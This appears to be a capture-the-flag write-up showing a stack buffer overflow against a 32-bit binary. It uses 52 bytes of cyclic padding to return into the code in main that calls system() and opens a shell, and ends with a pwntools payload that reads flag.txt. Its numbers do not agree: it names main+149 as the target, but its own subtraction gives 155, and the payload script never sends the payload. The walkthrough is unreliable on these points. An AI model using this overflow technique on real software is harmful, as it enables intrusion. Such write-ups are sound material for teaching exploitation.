

``main`` use return value from ``vuln`` to determine the final output. But return from ``vuln`` is not going to be ``true`` due to the logic below.


```c
int good = 0;
  for (int i = 0; buf[i]; i++) {
  good &= buf[i] ^ buf[i];
}

return good

```

We need ``main`` to go to the branch that call ``system`` to launch a shell. How about we just jmp to the critical block of code?

```asm
080485df <main>:
 80485df:       8d 4c 24 04             lea    0x4(%esp),%ecx
 80485e3:       83 e4 f0                and    $0xfffffff0,%esp
 80485e6:       ff 71 fc                pushl  -0x4(%ecx)
 80485e9:       55                      push   %ebp
...

 8048674:       83 c4 10                add    $0x10,%esp
 8048677:       83 ec 0c                sub    $0xc,%esp
 804867a:       68 99 87 04 08          push   $0x8048799
 804867f:       e8 cc fd ff ff          call   8048450 <system@plt>
```

The ``system`` call starts at *0x804867a*, we can calculate the distance between ``main`` and the call, so the destination would be ``main+149``.

```python
distance = 0x804867a-0x80485df = 155
```

The padding can be found by ``pwn.cyclic``, feed the program with *64* bytes of cyclic string.

```python
>>> pwn.cyclic(64)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa'
```

Check segfault message in ``dmesg``, notice the ``6161616e`` part? The padding is ``52`` in this case.

```bash
segfault at 6161616e ip 000000006161616e sp 00000000ffc07c30 error 14 in libc-2.27.so[f7d69000+1d2000]
```

```python
>>> pwn.cyclic_find(0x6161616e)
52
```

So the payload is ``52 bytes of garbage + address of system call block``.

```python
payload = b'A'*52
payload += pwn.p32(elf.sym["main"]+149)

pr.sendline("cat flag.txt")
print(pr.readall(2).decode())
```
